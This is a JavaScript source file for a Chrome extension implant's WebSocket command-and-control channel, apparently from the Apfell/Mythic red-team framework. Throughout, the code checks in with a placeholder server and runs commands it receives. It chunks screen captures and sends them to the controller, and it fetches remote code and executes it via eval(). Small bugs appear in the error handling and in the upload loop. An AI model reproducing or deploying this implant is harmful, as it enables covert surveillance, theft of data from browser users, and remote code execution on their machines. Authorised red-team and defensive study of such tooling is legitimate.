//------------- Chrome Extension Websocket C2 mechanisms ---------------------------------
// Dictionary that holds outbound messages
var out = [];
let screencaptures = [];
let loads = [];
class customC2 extends baseC2{
    constructor(host, port, endpoint, ssl , interval){
        super(host, port, endpoint, ssl, interval);
        this.host = host;
        this.port = port;
        this.endpoint = endpoint;
        this.interval = interval;
        this.commands = {};

        if (ssl === true){
            this.proto = 'wss://';
        } else {
            this.proto = 'ws://';
        }

        this.server = `${this.proto}${this.host}:${this.port}/${this.endpoint}`;
    }

    getConfig() {
        return JSON.stringify({'server': this.server, 'interval':this.interval, 'commands': JSON.stringify(this.commands)});
    }

    checkIn() {
        const msg = {
            "action":"checkin",
            "os":"chrome",
            "user":apfell.userinfo,
            "uuid":apfell.uuid,
            "host":apfell.userinfo + "'s chrome",
            "pid":0,
            "ip":'127.0.0.1',
        };

        let checkin = JSON.stringify(msg);
        let checkinpayload = apfell.uuid + checkin;

        const meta = {
            "client": true,
            "data": btoa(unescape(encodeURIComponent(checkinpayload))),
            "tag":"",
        };

        const encmsg = JSON.stringify(meta);
        connection.send(encmsg);
        console.log('Sent initial checkin');
    }

    postResponse(){
        if (out.length > 0){
            // Pop and send a message to the controller
            while (out.length > 0) {
                const msg = out.shift();
                const meta = {
                    "client":true,
                    "data": msg,
                    "tag":""
                };
                let final = JSON.stringify(meta);
                connection.send(final);
            }
        }
    }
}

//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
const C2 = new customC2('HOST_REPLACE',  PORT_REPLACE, 'ENDPOINT_REPLACE', SSL_REPLACE, INTERVAL_REPLACE);
const connection  = new WebSocket(`${C2.server}`);

setInterval(function(){
    C2.postResponse();
    if (apfell.apfellid.length !== 0) {
        let request = {'action':'get_tasking', 'tasking_size': 1, 'delegates':[]};
        let msg = JSON.stringify(request);
        let final = apfell.apfellid + msg;
        let encfinal = btoa(unescape(encodeURIComponent(final)));
        out.push(encfinal);
    } else {
        console.log('Apfell id not set for tasking ' + apfell.apfellid);
    }
}, C2.interval * 1000);

connection.onopen = function () {
    C2.checkIn();
};

connection.onclose = function () {
    // Do Nothing
};

connection.onerror = function () {
    // Do Nothing
};

connection.onmessage = function (e) {
    const rawmsg = JSON.parse(e.data);
    const decoded = atob(rawmsg.data);
    const messagenouuid = decoded.slice(36, decoded.length);

    const message = JSON.parse(messagenouuid);
    switch (message.action) {
        case 'checkin': {
            // callback check in
            apfell.apfellid = message.id;
            break;
        }
        case 'get_tasking' : {
            // handle an apfell message

            for (let index = 0; index < message.tasks.length; index++) {
                const task = message.tasks[index];

                try {
                    C2.commands[task.command](task);
                } catch (error) {
                    let response = {'task_id':task.id, 'completed':false, 'status':'error', 'error':'error processing task for id ' + task.id};
                    let outer_response = {'action':'post_response','responses':[response], 'delegates':[]};
                    let msg = btoa(unescape(encodeURIComponent(apfell.apfellid + JSON.stringify(outer_response))));
                    out.push(msg);
                    console.log("Error executing task: " + err);
                }
            }

            break;
        }
        case 'post_response' : {
            for (let index = 0; index < message.responses.length; index++) {
                const response = message.responses[index];
                
                // check for screencaptures 
                if (screencaptures.length > 0) {
                    for (let i = 0; i < screencaptures.length; i++) {
                        const capture = screencaptures[i];
                        let equal = response.task_id.localeCompare(capture.task_id);
                        if (equal === 0) {
                            // TODO: chunk the screencapture data
                            let raw = capture.image;
                            let arrLength = raw.length;
                            let temp = [];
                            let chunkSize = 512000;

                            for (let index = 0; index < arrLength; index+=chunkSize) {
                                let chunk = raw.slice(index, index+chunkSize);
                                temp.push(chunk);
                            }

                            // loop through the chunk array and send each one to apfell
                            for (let j = 0; j < temp.length; j++) {
                                let response = {
                                    'chunk_num': j+1,
                                    'file_id': capture.file_id,
                                    'chunk_data': btoa(unescape(encodeURIComponent(temp[j]))),
                                    'task_id': capture.task_id,
                                };

                                let outer_response = {
                                    'action':'post_response',
                                    'responses':[response],
                                    'delegates':[]
                                };

                                let enc = JSON.stringify(outer_response);
                                let final = apfell.apfellid + enc;
                                let msg = btoa(unescape(encodeURIComponent(final)));
                                out.push(msg);
                            }

                            screencaptures[i] = {};
                            if (screencaptures.length === 1 ) {
                                screencaptures = [];
                            }
                        }
                    }
                }
            }

            break;
        }
        case 'upload' : {
            // check for load command responses
            for (let i = 0; i < message.responses.length; i++) {
                const response = message.response[i];
                if (loads.length > 0) {
                    for (let i = 0; i < loads.length; i++) {
                        let equal = response.task_id.localeCompare(loads[i].task_id);
                        if (equal === 0) {
                            let load = loads[i];
                            if (response.chunk_num < response.total_chunks) {
                                let raw = atob(response.chunk_data);
                                load.data.push(...raw);
                                loads[i] = load;
                                let resp = {'action':'upload','chunk_size': 1024000, 'chunk_num':(response.chunk_num + 1), 'file_id':load.file_id, 'full_path':''};
                                let encodedResponse = JSON.stringify(resp);
                                let final = apfell.apfellid + encodedResponse;
                                let msg = btoa(unescape(encodeURIComponent(final)));
                                out.push(msg);
                            } else if (response.chunk_num === response.total_chunks) {
                                let raw = atob(response.chunk_data);
                                load.data.push(...raw);
                                eval(load.data);

                                let response = {'task_id':load.task_id, 'user_output': load.name + " loaded", "completed":true};
                                let outer_response = {'action':'post_response', 'responses':[response], 'delegates':[]};
                                let enc = JSON.stringify(outer_response);
                                let final = apfell.apfellid + enc;
                                let msg = btoa(unescape(encodeURIComponent(final)));
                                loads[i] = {};
                                out.push(msg);
                            }
                        }
                    }
                }
            }

        }
    }
};